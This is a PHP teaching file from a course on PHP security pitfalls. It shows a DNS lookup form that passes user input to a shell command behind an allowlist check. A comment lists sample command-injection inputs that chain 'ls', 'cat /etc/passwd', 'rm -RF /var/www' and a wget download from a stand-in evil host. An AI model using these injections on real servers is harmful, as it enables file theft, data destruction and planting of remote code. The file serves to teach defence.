<?php 
/**
 * This code is part of the Tutsplus course PHP Security Pitfalls. 
 * It is meant for demonstration purposes only. 
 * Do not use this code in a production environment!
 */

session_start(); 

// Redirect user if banned
if (isset($_SESSION['banned']) && $_SESSION['banned'] == TRUE) {
    header('location: banned.php');
}

// Validate input against array of possible values
$array = array('google.com', 'yahoo.com', 'bing.com');
if (in_array($_POST['host'], $array) == FALSE) {
    
    // Validation failed. Ban the user!
    $_SESSION['banned'] = TRUE;
    header('location: banned.php');
}
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <title></title>
    
    <!--[if lt IE 9]>
    <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

</head>

<body>

<h1>DNS lookup</h1>
<form action="#" method="post">
 <select name="host" id="host">
     <option value="google.com">google.com</option>
     <option value="yahoo.com">yahoo.com</option>
     <option value="bing.com">bing.com</option>
 </select>
 <input type="submit" />
</form>

<?php

/* 
Possible injections:
$_POST['host'] = 'google.com; ls'; // Get contents of current folder
$_POST['host'] = 'google.com; ls ../'; // Get contents of parent folder
$_POST['host'] = 'google.com; cat /etc/passwd'; // Get contents the users file for your server
$_POST['host'] = 'google.com; rm -RF /var/www'; // Delete the folder that contains all of your server's websites
$_POST['host'] = 'google.com; wget ftp://username:password@myevilsite.com/myevilscript.php'; // Upload an evil script to the server 
*/

if (isset($_POST['host']) && in_array($_POST['host'], $array)) {
    echo '<pre>';
    system('nslookup ' . $_POST['host']);
}
?>

</body>
</html>